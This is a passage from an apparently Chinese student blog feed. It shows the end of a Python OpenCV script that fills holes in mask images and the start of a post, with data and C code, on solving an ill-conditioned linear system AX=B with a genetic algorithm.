class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 划线法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fulling</span>(<span class="params">img</span>):</span><br><span class="line">    img1 = img.copy()</span><br><span class="line">    img2 = img.copy()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 横向</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.shape[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span> img[i][j] == <span class="number">255</span>:</span><br><span class="line">                flag = <span class="keyword">not</span> flag</span><br><span class="line">                <span class="keyword">while</span> img[i][j] == <span class="number">255</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> j &amp;gt;= img.shape[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j &amp;gt;= img.shape[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">                img1[i][j] = <span class="number">255</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">    cv2.imshow(<span class="string">&quot;1&quot;</span>, img1)</span><br><span class="line">    <span class="comment"># 纵向</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.shape[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.shape[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">if</span> img[j][i] == <span class="number">255</span>:</span><br><span class="line">                flag = <span class="keyword">not</span> flag</span><br><span class="line">                <span class="keyword">while</span> img[j][i] == <span class="number">255</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> j &amp;gt;= img.shape[<span class="number">0</span>]:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j &amp;gt;= img.shape[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">                img2[j][i] = <span class="number">255</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">    cv2.imshow(<span class="string">&quot;2&quot;</span>, img2)</span><br><span class="line">    img = img1 &amp;amp; img2</span><br><span class="line">    <span class="comment"># cv2.imshow(&quot;3&quot;, img)</span></span><br><span class="line">    cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ 0000000010000000001000000 ]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one_picture</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="comment"># breakpoint_connect_path = r&#x27;./pictures/output_canong3_canonxt_sub_05.tif&#x27;</span></span><br><span class="line">    <span class="comment"># save_path=r&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># breakpoint_connect_mask = Image.open(breakpoint_connect_path)</span></span><br><span class="line">    <span class="keyword">if</span> src.split() == <span class="number">3</span>:</span><br><span class="line">        src = src.split()[<span class="number">0</span>]</span><br><span class="line">    img = np.asarray(src)</span><br><span class="line">    <span class="built_in">print</span>(img)</span><br><span class="line">    img = fulling(img)</span><br><span class="line">    cv2.imwrite(<span class="string">&quot;pictures/pic.png&quot;</span>, img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">all_picture_full</span>(<span class="params"><span class="built_in">input</span>, output</span>):</span><br><span class="line">    src_path = <span class="built_in">input</span></span><br><span class="line">    save_path = output</span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(os.listdir(src_path)):</span><br><span class="line">        _src_path = os.path.join(src_path, item)</span><br><span class="line">        _save_path = os.path.join(save_path, item)</span><br><span class="line">        pred_mask = Image.<span class="built_in">open</span>(_src_path)</span><br><span class="line">        <span class="keyword">if</span> pred_mask.split() == <span class="number">3</span>:  <span class="comment"># 若为3rgb图像 则会读取为灰度</span></span><br><span class="line">            pred_mask = pred_mask.split()[<span class="number">0</span>]</span><br><span class="line">        pred_mask = np.array(pred_mask)</span><br><span class="line"></span><br><span class="line">        _mask_after_full = fulling(pred_mask)  <span class="comment"># 关键函数</span></span><br><span class="line"></span><br><span class="line">        _mask_after_full = Image.fromarray(_mask_after_full.astype(np.uint8))</span><br><span class="line">        _mask_after_full.save(_save_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(index + <span class="number">1</span>, <span class="built_in">len</span>(os.listdir(src_path))))</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># breakpoint_full_path = r&#x27;./pictures/output_canong3_canonxt_sub_05.tif&#x27;</span></span><br><span class="line">    <span class="comment"># breakpoint_full_mask = Image.open(breakpoint_full_path)</span></span><br><span class="line">    <span class="comment"># one_picture(breakpoint_full_mask)  # 单张图片测试</span></span><br><span class="line">    src_path = <span class="string">r&#x27;C:\Users\brighten\Desktop\0324_两阶段_0306模型,只监督条带区域，带8张图\columb\result2&#x27;</span></span><br><span class="line">    save_path = <span class="string">r&#x27;C:\Users\brighten\Desktop\0324_两阶段_0306模型,只监督条带区域，带8张图\columb\result3&#x27;</span></span><br><span class="line">    all_picture_full(src_path, save_path)  <span class="comment"># 文件夹内所有图片</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纯C，使用遗传算法对病态线性方程组求解AX=B</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E7%BA%AFC%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%AF%B9%E7%97%85%E6%80%81%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84%E6%B1%82%E8%A7%A3AX=B/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20%E7%BA%AFC%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%AF%B9%E7%97%85%E6%80%81%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84%E6%B1%82%E8%A7%A3AX=B/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  纯C，使用遗传算法对病态线性方程组求解AX&#x3D;B</p><h1 id="纯C，使用遗传算法对病态线性方程组求解AX-x3D-B"><a href="#纯C，使用遗传算法对病态线性方程组求解AX-x3D-B" class="headerlink" title="纯C，使用遗传算法对病态线性方程组求解AX&#x3D;B"></a>纯C，使用遗传算法对病态线性方程组求解AX&#x3D;B</h1><h2 id="使用遗传算法对病态线性方程组求解"><a href="#使用遗传算法对病态线性方程组求解" class="headerlink" title="使用遗传算法对病态线性方程组求解"></a>使用遗传算法对病态线性方程组求解</h2><p>对于什么是遗传算法，在松鼠科学会上有一篇有趣的文章<br> <a href="https://songshuhui.net/archives/10462">遗传算法构建firefox图标</a></p><p>遗传算法 的大致框架如下图所示<br> 下面的长代码有什么用呢？<br> 它使用算法遗传解决了</p><h2 id="AX-x3D-B"><a href="#AX-x3D-B" class="headerlink" title="AX&#x3D;B"></a><strong>AX&#x3D;B</strong></h2><p>的问题</p><p>我就觉得效率不是很高，使用起来有很大的不便。</p><blockquote></blockquote><p>什么是遗传算法呢？</p><p>简单地说，遗传算法是一种解决问题的方法。它模拟大自然中种群在选择压力下的演化，从而得到问题的一个近似解。</p><p>将以下数据放入A.txt,B.txt<br> 将上述文件放入程序文件同目录</p><h2 id="A的数据"><a href="#A的数据" class="headerlink" title="A的数据"></a>A的数据</h2><p>(1, 1, 1)<br> (2, 8, -1)<br> (2, 3, -1)<br> (2, 2, 4)<br> (3, 9, -1)<br> (3, 2, -1)<br> (3, 3, 4)<br> (4, 4, 1)<br> (5, 2, -1)<br> (5, 6, -1)<br> (5, 5, 4)<br> (6, 2, -1)<br> (6, 5, -1)<br> (6, 6, 4)<br> (7, 7, 1)<br> (8, 6, -1)<br> (8, 9, -1)<br> (8, 8, 4)<br> (9, 5, -1)<br> (9, 8, -1)<br> (9, 9, 4)<br> (10, 10, 1)<br> (11, 7, -1)<br> (11, 12, -1)<br> (11, 11, 4)<br> (12, 2, -1)<br> (12, 11, -1)<br> (12, 12, 4)</p><h2 id="B的数据"><a href="#B的数据" class="headerlink" title="B的数据"></a>B的数据</h2><p>(1, 1, 2)<br> (2, 1, 5)<br> (3, 1, 4)<br> (4, 1, 2)<br> (5, 1, 5)<br> (6, 1, 4)<br> (7, 1, 2)<br> (8, 1, 7)<br> (9, 1, 3)<br> (10, 1, 4)<br> (11, 1, 0)<br> (12, 1, 4）</p><h2 id="X的结果"><a href="#X的结果" class="headerlink" title="X的结果"></a>X的结果</h2><p>2.039260<br> 2.469905<br> 2.118222<br> 2.037000<br> 2.412758<br> 2.226262<br> 2.044251<br> 2.806577<br> 2.044782<br> 4.032598<br> 1.827159<br> 5.236275</p><p>使用以下代码前需要把第6行和第10行的opencv库调用删除，如果没有把opencv的库装到某些奇怪的地方的话。<br> 此代码共计600行阅读可能存在一定的困难</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">#include&amp;lt;stdio.h&amp;gt;</span><br><span class="line">#include&amp;lt;math.h&amp;gt;</span><br><span class="line">#include&amp;lt;string.h&amp;gt;</span><br><span class="line">#include&amp;lt;stdlib.h&amp;gt;</span><br><span class="line">#include&amp;lt;opencv.hpp&amp;gt;</span><br><span class="line">#include &amp;lt;iostream&amp;gt;</span><br><span class="line">#include &amp;lt;time.h&amp;gt;</span><br><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">using namespace cv;</span><br><span class="line">#define SUM 200   //总共的染色体数量</span><br><span class="line">#define MAXloop  2000000//最大循环次数</span><br><span class="line">#define error 10   //若两次最优值之差小于此数则认为结果没有改变</span><br><span class="line">#define crossp 0.1      //交叉概率</span><br><span class="line">#define mp 0.4           //变异概率</span><br><span class="line">#define length 12</span><br><span class="line">float X[length+1];</span><br><span class="line">//#define d 0</span><br><span class="line">float a[length+1];</span><br><span class="line">typedef struct NODE//稀疏方程组数据</span><br><span class="line">&#123;</span><br><span class="line">int row;</span><br><span class="line">int col;</span><br><span class="line">int date;</span><br><span class="line">struct NODE* next;</span><br><span class="line">&#125;node;</span><br><span class="line">//   Ax = b    x的各元素在（0,255）之间的最小值 </span><br><span class="line">struct gen                //定义染色体结构X</span><br><span class="line">&#123;</span><br><span class="line">float  info[length+1];        //染色体结构 //表示length 个(0,255)的整数</span><br><span class="line">float  suitability;//次染色体所对应的适应度函数值，在本题中为f(x)=|AX-B|的无穷范数 理想状态应该是1 选择时最大的  我们把它设置成整数就是f(x)的值</span><br><span class="line">&#125;;</span><br><span class="line">struct gen gen_group[SUM];//定义一个含有20个染色体的组</span><br><span class="line">struct gen gen_new[SUM];</span><br><span class="line">struct gen gen_yi[SUM];</span><br><span class="line">struct gen gen_result;    //记录最优的染色体</span><br><span class="line">int result_unchange_time=0; //记录在error前提下最优值为改变的循环次数</span><br><span class="line">struct log                //形成链表，记录每次循环所产生的最优的适应度</span><br><span class="line">&#123;</span><br><span class="line">int suitability;</span><br><span class="line">struct log* next;</span><br><span class="line">&#125;llog, * head, * end;</span><br><span class="line">int randNext(int left, int right);</span><br><span class="line">int randsign(float p)//按概率p返回1</span><br><span class="line">&#123;</span><br><span class="line">if (randNext(0,32768) &amp;gt; (p * 32768))//32768是INT的最大值 </span><br><span class="line">return 0;</span><br><span class="line">else return 1;</span><br><span class="line">&#125;</span><br><span class="line">int log_num;              //链表长度</span><br><span class="line">node * head1, * head2;</span><br><span class="line">void initiate();          //初始化函数，主要负责产生初始化种群 </span><br><span class="line">void evaluation(int flag);//评估种群中各染色体的适应度，并据此进行排序 </span><br><span class="line">void cross();//交叉函数 </span><br><span class="line">void selection(int x);//选择函数 </span><br><span class="line">int  record();//记录每次循环产生的最优解并判断是否终止循环 </span><br><span class="line">void mutation();//变异函数 </span><br><span class="line">float f(gen G);</span><br><span class="line"></span><br><span class="line">void initiate()//初始化 </span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int j;</span><br><span class="line">for (i = 0; i &amp;lt; SUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">for (j = 1; j &amp;lt;= length; j++) &#123;</span><br><span class="line">gen_group[i].info[j] =1.0* randNext(0,500000)/10000.0;//从1开始</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">gen_result.suitability = 10;//最优解.对应的函数值 </span><br><span class="line">&#125;</span><br><span class="line">//返回[left, right]的随机数</span><br><span class="line">int randNext(int left, int right)</span><br><span class="line">&#123;</span><br><span class="line">static unsigned int seed = 0;</span><br><span class="line">seed++;</span><br><span class="line">srand((unsigned)time(NULL) + seed * seed);</span><br><span class="line">return rand() % (right - left + 1) + left;</span><br><span class="line">&#125;</span><br><span class="line">int ff(int x,int y) &#123;//防止近亲交配</span><br><span class="line">int count = 0;</span><br><span class="line">int i, j;</span><br><span class="line">for (i = 1;i &amp;lt;= length;i++) &#123;</span><br><span class="line">if (1.0*gen_group[x].info[i] - 1.0*gen_group[y].info[i]&amp;lt;=0.1&amp;amp;&amp;amp; 1.0*gen_group[x].info[i] - 1.0*gen_group[y].info[i] &amp;gt;=- 0.1) &#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (count == length) &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void cross()//交叉函数 交叉变异 交叉公式为x3=A * x1 +(1-A) * x2</span><br><span class="line">&#123;</span><br><span class="line">int i, j, k;</span><br><span class="line">int c;</span><br><span class="line">float A;</span><br><span class="line">//int mask1, mask2;</span><br><span class="line">int a[SUM];//sum=20 </span><br><span class="line">//printf(&quot;55&quot;);</span><br><span class="line">for (i = 0; i &amp;lt; SUM; i++)  a[i] = 0;//记录是否交叉过 0-19</span><br><span class="line">k = 0;</span><br><span class="line">int x = 0;</span><br><span class="line">int s;</span><br><span class="line">for (i = 0; i &amp;lt; SUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (a[i] == 0)</span><br><span class="line">&#123;</span><br><span class="line">j = randNext(i + 1, SUM - 1);</span><br><span class="line">while (ff(i,j)||a[j]!=0) &#123;</span><br><span class="line">j = randNext(i + 1, SUM - 1);//产生一个在i+1，sum-1两个数之间的随机整数</span><br><span class="line">&#125;</span><br><span class="line">//if (a[j] == 0)break; //直到选择到未交叉过的</span><br><span class="line">A = (1.0*gen_group[i].suitability/(gen_group[i].suitability*1.0+1.0*gen_group[j].suitability));</span><br><span class="line">x = int(A * 1.0*length);</span><br><span class="line">if (randsign(crossp) == 1)//按照crossp的概率对选择的染色体进行交叉操作 返回0或1   其值为1的概率为crossp  算数交换</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">for (c =1;c &amp;lt;= length;c++) 